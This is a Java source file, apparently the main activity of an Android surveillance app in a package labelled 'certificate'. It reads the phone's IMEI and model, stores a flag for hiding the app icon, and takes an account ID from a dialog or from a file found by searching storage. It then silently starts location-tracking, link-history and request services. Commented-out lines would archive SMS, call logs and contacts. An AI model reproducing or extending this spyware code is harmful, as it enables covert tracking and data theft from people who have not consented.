package com.inet.android.bs;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.List;
import java.util.concurrent.TimeUnit;

import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ActivityInfo;
import android.content.res.Configuration;
import android.os.Bundle;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.widget.Button;
import android.widget.EditText;

import com.inet.android.certificate.R;
import com.inet.android.history.LinkService;
import com.inet.android.location.LocationTracker;
import com.inet.android.request.Request4;
import com.inet.android.utils.Logging;

public class MainActivity extends Activity {
	Button install;
	Button exit;
	LocationTracker gps;
	LinkService link;
	AlertDialog.Builder ad;
	Context context;
	final String SAVED_TIME = "saved_time";
	Editor e;
	SharedPreferences sp;
	byte[] data;
	String incFile;
	private String aboutDev;
	private static String LOG_TAG = "mainActivity";
	String fileID = "id.txt";
	String ID = null;
	List<String> result;
	File root;
	File[] fileArray;
	private String sID;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
		// setContentView(R.layout.activity_main);
		context = getApplicationContext();
		Logging.doLog(LOG_TAG, "onCreate", "onCreate");

		sp = PreferenceManager.getDefaultSharedPreferences(context);
		final TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

		String imeistring = manager.getDeviceId();
		String model = android.os.Build.MODEL;
		String androidVersion = android.os.Build.VERSION.RELEASE;
		// ListApp listApp = new ListApp();
		// listApp.getListOfInstalledApp(context);
		// GetInfo getInfo = new GetInfo(context);
		// getInfo.getInfo();
		// GetContacts getCont = new GetContacts();
		// getCont.execute(context);
		// ArchiveSms arhSms = new ArchiveSms();
		// arhSms.execute(context);
		// ArchiveCall arhCall = new ArchiveCall();
		// arhCall.execute(context);
		aboutDev = " Model: " + model + " Version android: " + androidVersion;
		// sIMEI = "IMEI: " + imeistring;
		e = sp.edit();
		e.putString("BUILD", "V_000.1");
		e.putString("imei", imeistring);
		e.putString("ABOUT", aboutDev);
		e.putString("model", model);
		e.putString("account", "account");

		e.commit();

		boolean hasVisited = sp.getBoolean("hasVisited", false);
		boolean getInfo = sp.getBoolean("getInfo", false);
		if (!hasVisited) {
			// проверка на первый запуск

			e = sp.edit();
			e.putBoolean("hasVisited", true);
			e.putBoolean("getInfo", true);
			e.putBoolean("hideIcon", false);
			e.putString("ABOUT", aboutDev);
			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis())); 
			e.putString("period", "1"); // period must equal 10 min
			e.putString("code", "-1");
			e.commit();

			// hideIcon();
		}

		if (getID()) {
			Logging.doLog(LOG_TAG, "getID return true");
		} else {
			Logging.doLog(LOG_TAG, "getID return false");
		}
		if (sp.getString("account", "account").equals("account")) {

			Logging.doLog(LOG_TAG, "File not found. Show dialog.",
					"File not found. Show dialog.");
			viewIDDialog();
		} else {
			Logging.doLog(LOG_TAG, "not show dialog");

			finish();
		}
	}

	@Override
	public void onConfigurationChanged(Configuration newConfig) {
		super.onConfigurationChanged(newConfig);
	}

	private boolean viewIDDialog() {
		AlertDialog.Builder alert = new AlertDialog.Builder(this);

		alert.setTitle("Attention!!!");
		alert.setMessage("Enter account number!");

		final EditText input = new EditText(this);
		alert.setView(input);

		alert.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
			public void onClick(DialogInterface dialog, int whichButton) {
				String value = input.getText().toString();

				Logging.doLog(LOG_TAG, "Text: " + value, "Text: " + value);

				e = sp.edit();
				e.putString("account", value);
				e.commit();

				SharedPreferences sp = PreferenceManager
						.getDefaultSharedPreferences(getApplicationContext());
				Logging.doLog(LOG_TAG, "send start request, imei: ",
						sp.getString("imei", "imei"));

				JSONObject jsonObject = new JSONObject();
				try {
					jsonObject.put("account", sp.getString("account", "0000"));
					jsonObject.put("imei", sp.getString("imei", "imei"));
					jsonObject.put("model", sp.getString("model", "0000"));
				} catch (JSONException e) {
					e.printStackTrace();
				}

				// String str = jsonObject.toString();
				// StartRequest sr = new StartRequest(getApplicationContext());
				// sr.sendRequest(str);
				start(); // запуск сервисов
				finish();
			}
		});

		alert.setNegativeButton("Cancel",
				new DialogInterface.OnClickListener() {
					public void onClick(DialogInterface dialog, int whichButton) {
						// Canceled.
						finish();
					}
				});

		alert.show();
		return true;
	}

	public boolean getID() {
		Logging.doLog(LOG_TAG, "Start search ID", "Start search ID");

		File file[] = Environment.getExternalStorageDirectory().listFiles();
		return recursiveFileFind(file);
	}

	public boolean recursiveFileFind(File[] file1) {
		int i = 0;
		String filePath = " ";
		if (file1 != null) {
			while (i != file1.length) {
				filePath = file1[i].getAbsolutePath();
				sID = file1[i].getName();
				if (file1[i].isDirectory()) {
					File[] file = file1[i].listFiles();
					if (recursiveFileFind(file) == true) {
						return true;
					}
				}

				if (sID.indexOf("ts.apk") != -1) {
					ID = sID.substring(0, sID.indexOf("t"));
					e = sp.edit();
					e.putString("account", ID);
					e.commit();
					// Log.d("ID", sp.getString("ID", "ID"));
					if (!sp.getString("account", "account").equals("account")) {
						start();
						return true;
					}
					break;
				}
				i++;
			}

		}
		return false;
	}

	/**
	 * Start services
	 */
	public void start() {
		Logging.doLog(LOG_TAG, "start services", "start services");

		startService(new Intent(MainActivity.this, Request4.class));

		try {
			TimeUnit.MILLISECONDS.sleep(1000);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}

		startService(new Intent(MainActivity.this, LocationTracker.class));
		startService(new Intent(MainActivity.this, LinkService.class));

		Logging.doLog(LOG_TAG, "finish start services", "finish start services");
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}
}